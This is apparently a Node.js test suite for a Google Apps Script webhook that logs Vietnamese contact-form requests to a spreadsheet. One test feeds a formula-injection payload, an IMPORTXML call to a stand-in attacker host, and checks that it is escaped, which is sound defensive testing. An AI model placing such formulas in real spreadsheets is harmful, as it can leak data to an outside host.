import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import vm from "node:vm";
import test from "node:test";

async function loadTemplate(uuids = ["abcd1234-0000-0000-0000-000000000000"]) {
  const rows = [];
  const toasts = [];
  const effectiveOwner = "owner@example.test";
  let uuidIndex = 0;

  class FakeValidation {
    constructor(values, allowInvalid) {
      this.values = values;
      this.allowInvalid = allowInvalid;
    }
  }

  class FakeRange {
    constructor(sheet, row, column, numRows = 1, numColumns = 1) {
      this.sheet = sheet;
      this.row = row;
      this.column = column;
      this.numRows = numRows;
      this.numColumns = numColumns;
    }

    setValues(values) {
      values.forEach((valueRow, rowOffset) => valueRow.forEach((value, columnOffset) => {
        this.sheet.setCell(this.row + rowOffset, this.column + columnOffset, value);
      }));
      return this;
    }

    setDataValidation(validation) {
      for (let row = this.row; row < this.row + this.numRows; row += 1) {
        for (let column = this.column; column < this.column + this.numColumns; column += 1) {
          this.sheet.validations.set(`${row}:${column}`, validation);
        }
      }
      return this;
    }

    getValue() { return this.sheet.getCell(this.row, this.column); }
    setValue(value) { this.sheet.setCell(this.row, this.column, value); return this; }
    getSheet() { return this.sheet; }
    getRow() { return this.row; }
    getColumn() { return this.column; }
  }

  class FakeProtection {
    constructor(sheet, editors = ["editor@example.test"], domainEdit = true) {
      this.sheet = sheet;
      this.description = "";
      this.editors = new Set(editors);
      this.domainEdit = domainEdit;
      this.warningOnly = false;
      this.targetAudiences = [];
      this.unprotectedRanges = [];
      this.removed = false;
      this.calls = [];
    }

    setDescription(description) { this.description = description; return this; }
    getDescription() { return this.description; }
    addEditor(editor) { this.calls.push({ method: "addEditor", editor }); this.editors.add(editor); return this; }
    getEditors() { return [...this.editors]; }
    removeEditors(editors) {
      this.calls.push({ method: "removeEditors", editors: [...editors] });
      editors.forEach((editor) => {
        if (editor !== effectiveOwner) this.editors.delete(editor);
      });
      return this;
    }
    canDomainEdit() { return this.domainEdit; }
    setDomainEdit(value) { this.domainEdit = value; return this; }
    isWarningOnly() { return this.warningOnly; }
    setWarningOnly(value) { this.warningOnly = value; return this; }
    addTargetAudience(audienceId) { this.targetAudiences.push(audienceId); return this; }
    getTargetAudiences() { return [...this.targetAudiences]; }
    removeTargetAudience(audienceId) {
      this.targetAudiences = this.targetAudiences.filter((item) => item !== audienceId);
      return this;
    }
    setUnprotectedRanges(ranges) { this.unprotectedRanges = ranges; return this; }
    remove() {
      this.removed = true;
      this.sheet.removedProtections.push(this);
      this.sheet.protection = null;
    }
  }

  class FakeSheet {
    constructor(name) {
      this.name = name;
      this.cells = new Map();
      this.validations = new Map();
      this.protection = null;
      this.removedProtections = [];
      this.frozenRows = 0;
      this.maxRows = 10;
    }

    appendRow(row) {
      const targetRow = this.getLastRow() + 1;
      row.forEach((value, index) => this.setCell(targetRow, index + 1, value));
      if (this.name === "Yêu cầu") rows.push(row);
    }

    clear() { this.cells.clear(); this.validations.clear(); }
    getName() { return this.name; }
    getMaxRows() { return this.maxRows; }
    getLastRow() { return [...this.cells.keys()].reduce((last, key) => Math.max(last, Number(key.split(":")[0])), 0); }
    getRange(row, column, numRows = 1, numColumns = 1) { return new FakeRange(this, row, column, numRows, numColumns); }
    setFrozenRows(count) { this.frozenRows = count; }
    protect() {
      if (!this.protection) this.protection = new FakeProtection(this);
      return this.protection;
    }
    getProtections() { return this.protection && !this.protection.removed ? [this.protection] : []; }
    setCell(row, column, value) { this.cells.set(`${row}:${column}`, value); }
    getCell(row, column) { return this.cells.get(`${row}:${column}`) ?? ""; }
    getValidation(row, column) { return this.validations.get(`${row}:${column}`); }
  }

  const sheets = new Map([["Yêu cầu", new FakeSheet("Yêu cầu")]]);
  const spreadsheet = {
    getSheetByName(name) { return sheets.get(name) || null; },
    insertSheet(name) { const sheet = new FakeSheet(name); sheets.set(name, sheet); return sheet; },
    toast(message) { toasts.push(message); },
  };
  const context = vm.createContext({
    ContentService: {
      MimeType: { JSON: "application/json" },
      createTextOutput(value) {
        return { setMimeType() { return { value }; } };
      },
    },
    JSON,
    PropertiesService: { getScriptProperties: () => ({ getProperty: () => "shared-secret" }) },
    Session: { getEffectiveUser: () => "owner@example.test", getScriptTimeZone: () => "Asia/Ho_Chi_Minh" },
    SpreadsheetApp: {
      newDataValidation: () => {
        const rule = { values: [], allowInvalid: true };
        return {
          requireValueInList(values) { rule.values = [...values]; return this; },
          setAllowInvalid(value) { rule.allowInvalid = value; return this; },
          build() { return new FakeValidation(rule.values, rule.allowInvalid); },
        };
      },
      getActiveSpreadsheet: () => spreadsheet,
    },
    Utilities: {
      formatDate: () => "20260725-100000",
      getUuid: () => uuids[uuidIndex++],
    },
  });
  const source = await readFile(new URL("../docs/google-apps-script-contact-webhook.gs", import.meta.url), "utf8");
  vm.runInContext(source, context);
  return { context, rows, sheets, toasts };
}

function submit(context, payload) {
  return context.doPost({ postData: { contents: JSON.stringify(payload) } });
}

function assertTimestamp(value) {
  assert.equal(Object.prototype.toString.call(value), "[object Date]");
  assert.equal(Number.isFinite(value.getTime()), true);
}

const validProductPayload = {
  email: "customer@example.test",
  message: "Cần tư vấn.",
  name: "Nguyễn Văn A",
  phone: "0900000000",
  product: "Bột dinh dưỡng",
  qty: 20,
  request_type: "Tư vấn số lượng lớn",
  secret: "shared-secret",
  service: "",
  source: "/lien-he/",
  variant: "Vị vani",
};

test("stores user-controlled values as safe plain text instead of spreadsheet formulas", async () => {
  const { context, rows } = await loadTemplate();
  const output = submit(context, {
    ...validProductPayload,
    message: "=IMPORTXML(\"https://attacker.example\", \"//x\")",
    name: "+cmd",
    product: "+Bột dinh dưỡng",
    source: "-1+1",
    variant: "@Vị vani",
  });

  const response = JSON.parse(output.value);
  assert.deepEqual(response, { ok: true, reference: "YC-20260725-100000-ABCD1234" });
  assert.deepEqual(Array.from(rows[0]), [
    "Mã",
    "Thời gian",
    "Loại",
    "Sản phẩm/Dịch vụ",
    "Biến thể",
    "Số lượng",
    "Họ tên",
    "Điện thoại",
    "Email",
    "Nội dung",
    "Nguồn",
    "Trạng thái",
    "Người phụ trách",
    "Ghi chú",
    "Cập nhật lần cuối",
  ]);
  assert.equal(rows[1].length, 15);
  assert.equal(response.reference, rows[1][0]);
  assertTimestamp(rows[1][1]);
  assertTimestamp(rows[1][14]);
  assert.equal(rows[1][1], rows[1][14]);
  assert.deepEqual(Array.from(rows[1].slice(2, 11)), [
    "Tư vấn số lượng lớn",
    "'+Bột dinh dưỡng",
    "'@Vị vani",
    20,
    "'+cmd",
    "0900000000",
    "customer@example.test",
    "'=IMPORTXML(\"https://attacker.example\", \"//x\")",
    "'-1+1",
  ]);
  assert.deepEqual(Array.from(rows[1].slice(11, 14)), ["Mới", "", ""]);
});

test("creates a distinct reference and row for every accepted submit", async () => {
  const { context, rows } = await loadTemplate([
    "abcd1234-0000-0000-0000-000000000000",
    "dcba4321-0000-0000-0000-000000000000",
  ]);

  const first = JSON.parse(submit(context, validProductPayload).value);
  const second = JSON.parse(submit(context, validProductPayload).value);

  assert.equal(rows.length, 3);
  assert.equal(first.reference, rows[1][0]);
  assert.equal(second.reference, rows[2][0]);
  assert.notEqual(first.reference, second.reference);
  assertTimestamp(rows[1][1]);
  assertTimestamp(rows[1][14]);
  assert.equal(rows[1][1], rows[1][14]);
  assertTimestamp(rows[2][1]);
  assertTimestamp(rows[2][14]);
  assert.equal(rows[2][1], rows[2][14]);
});

test("rejects mixed and malformed contexts without appending rows", async () => {
  const { context, rows } = await loadTemplate();
  const invalidPayloads = [
    { ...validProductPayload, service: "Sấy & thực phẩm sấy" },
    { ...validProductPayload, qty: "20" },
  ];

  for (const payload of invalidPayloads) {
    assert.deepEqual(JSON.parse(submit(context, payload).value), { ok: false, reference: "" });
  }
  assert.equal(rows.length, 0);
});

test("configures the exact headers, frozen row, and rejecting dropdowns", async () => {
  const { context, sheets } = await loadTemplate();
  context.setupRequestWorkbook();

  const requestSheet = sheets.get("Yêu cầu");
  assert.deepEqual(Array.from({ length: 15 }, (_, index) => requestSheet.getCell(1, index + 1)), [
    "Mã", "Thời gian", "Loại", "Sản phẩm/Dịch vụ", "Biến thể", "Số lượng", "Họ tên", "Điện thoại", "Email", "Nội dung", "Nguồn", "Trạng thái", "Người phụ trách", "Ghi chú", "Cập nhật lần cuối",
  ]);
  assert.equal(requestSheet.frozenRows, 1);
  const typeValidation = requestSheet.getValidation(2, 3);
  assert.deepEqual([...typeValidation.values], ["Đặt sản phẩm", "Tư vấn số lượng lớn", "Tư vấn dịch vụ"]);
  assert.equal(typeValidation.allowInvalid, false);
  const statusValidation = requestSheet.getValidation(10, 12);
  assert.deepEqual([...statusValidation.values], ["Mới", "Đang tư vấn", "Chờ khách phản hồi", "Đã hoàn tất", "Không tiếp tục"]);
  assert.equal(statusValidation.allowInvalid, false);
});

test("reuses one native sheet protection and leaves Yêu cầu L:N editable", async () => {
  const { context, sheets } = await loadTemplate();
  const requestSheet = sheets.get("Yêu cầu");
  const requestProtectionBeforeSetup = requestSheet.protect()
    .setDescription("Existing request protection").setWarningOnly(true)
    .addTargetAudience("request-audience");
  const summarySheet = context.SpreadsheetApp.getActiveSpreadsheet().insertSheet("Tổng quan");
  const summaryProtectionBeforeSetup = summarySheet.protect()
    .setDescription("Existing summary protection").setWarningOnly(true)
    .addTargetAudience("summary-audience");

  context.setupRequestWorkbook();
  context.setupRequestWorkbook();

  for (const sheet of [requestSheet, summarySheet]) {
    const activeProtections = sheet.getProtections();
    assert.equal(activeProtections.length, 1);
    const protection = activeProtections[0];
    assert.equal(protection, sheet === requestSheet ? requestProtectionBeforeSetup : summaryProtectionBeforeSetup);
    assert.deepEqual(protection.getEditors(), ["owner@example.test"]);
    assert.equal(protection.calls[0].method, "addEditor");
    assert.equal(protection.calls[1].method, "removeEditors");
    assert.equal(protection.canDomainEdit(), false);
    assert.equal(protection.isWarningOnly(), false);
    assert.deepEqual(protection.getTargetAudiences(), []);
    assert.equal(sheet.removedProtections.length, 0);
  }
  const requestProtection = requestSheet.getProtections()[0];
  assert.equal(requestProtection.getDescription(), "Lean V1: Chỉ vận hành L:N");
  assert.equal(requestProtection.unprotectedRanges.length, 1);
  const editableRange = requestProtection.unprotectedRanges[0];
  assert.deepEqual([editableRange.row, editableRange.column, editableRange.numRows, editableRange.numColumns], [2, 12, 9, 3]);
  const summaryProtection = summarySheet.getProtections()[0];
  assert.equal(summaryProtection.getDescription(), "Lean V1: Tổng quan chỉ đọc");
  assert.deepEqual(summaryProtection.unprotectedRanges, []);
});

test("writes the exact Tổng quan labels and count formulas", async () => {
  const { context, sheets } = await loadTemplate();
  context.setupRequestWorkbook();

  const summarySheet = sheets.get("Tổng quan");
  assert.deepEqual([
    [summarySheet.getCell(1, 1), summarySheet.getCell(1, 2)],
    [summarySheet.getCell(2, 1), summarySheet.getCell(2, 2)],
    [summarySheet.getCell(3, 1), summarySheet.getCell(3, 2)],
  ], [
    ["Chỉ số", "Số lượng"],
    ["Đơn mới", '=COUNTIFS(\'Yêu cầu\'!C:C,"Đặt sản phẩm",\'Yêu cầu\'!L:L,"Mới")'],
    ["Yêu cầu mới", '=COUNTIFS(\'Yêu cầu\'!C:C,"Tư vấn số lượng lớn",\'Yêu cầu\'!L:L,"Mới")+COUNTIFS(\'Yêu cầu\'!C:C,"Tư vấn dịch vụ",\'Yêu cầu\'!L:L,"Mới")'],
  ]);
});

test("allows every defined status transition and timestamps valid L:N edits", async () => {
  const { context, sheets } = await loadTemplate();
  const requestSheet = sheets.get("Yêu cầu");
  const transitions = [
    ["Mới", "Đang tư vấn", "An", 2],
    ["Đang tư vấn", "Chờ khách phản hồi", "", 3],
    ["Đang tư vấn", "Đã hoàn tất", "", 4],
    ["Đang tư vấn", "Không tiếp tục", "", 5],
    ["Chờ khách phản hồi", "Đang tư vấn", "", 6],
    ["Chờ khách phản hồi", "Đã hoàn tất", "", 7],
    ["Chờ khách phản hồi", "Không tiếp tục", "", 8],
  ];
  for (const [oldValue, value, assignee, row] of transitions) {
    requestSheet.setCell(row, 12, value);
    requestSheet.setCell(row, 13, assignee);
    context.onEdit({ oldValue, value, range: requestSheet.getRange(row, 12) });
    assertTimestamp(requestSheet.getCell(row, 15));
  }

  requestSheet.setCell(9, 15, "before");
  context.onEdit({ range: requestSheet.getRange(9, 13) });
  assertTimestamp(requestSheet.getCell(9, 15));
  requestSheet.setCell(10, 15, "before");
  context.onEdit({ range: requestSheet.getRange(10, 14) });
  assertTimestamp(requestSheet.getCell(10, 15));
});

test("restores invalid status edits, including terminal reopens, without timestamps", async () => {
  const { context, sheets, toasts } = await loadTemplate();
  const requestSheet = sheets.get("Yêu cầu");
  const invalidEdits = [
    ["Mới", "Đang tư vấn", "", 2],
    ["Mới", "Đã hoàn tất", "An", 3],
    ["Đang tư vấn", "Mới", "An", 4],
    ["Đã hoàn tất", "Đang tư vấn", "An", 5],
    ["Không tiếp tục", "Đang tư vấn", "An", 6],
  ];
  for (const [oldValue, value, assignee, row] of invalidEdits) {
    requestSheet.setCell(row, 12, value);
    requestSheet.setCell(row, 13, assignee);
    requestSheet.setCell(row, 15, "unchanged");
    context.onEdit({ oldValue, value, range: requestSheet.getRange(row, 12) });
    assert.equal(requestSheet.getCell(row, 12), oldValue);
    assert.equal(requestSheet.getCell(row, 15), "unchanged");
  }
  assert.deepEqual(toasts, Array(5).fill("Trạng thái hoặc người phụ trách không hợp lệ."));
});

test("does not timestamp edits outside Yêu cầu data columns L:N", async () => {
  const { context, sheets } = await loadTemplate();
  const requestSheet = sheets.get("Yêu cầu");
  const summarySheet = context.SpreadsheetApp.getActiveSpreadsheet().insertSheet("Tổng quan");
  requestSheet.setCell(2, 15, "request unchanged");
  requestSheet.setCell(1, 15, "header unchanged");
  summarySheet.setCell(2, 15, "summary unchanged");

  context.onEdit({ range: requestSheet.getRange(2, 11) });
  context.onEdit({ range: requestSheet.getRange(1, 12) });
  context.onEdit({ range: summarySheet.getRange(2, 12) });

  assert.equal(requestSheet.getCell(2, 15), "request unchanged");
  assert.equal(requestSheet.getCell(1, 15), "header unchanged");
  assert.equal(summarySheet.getCell(2, 15), "summary unchanged");
});
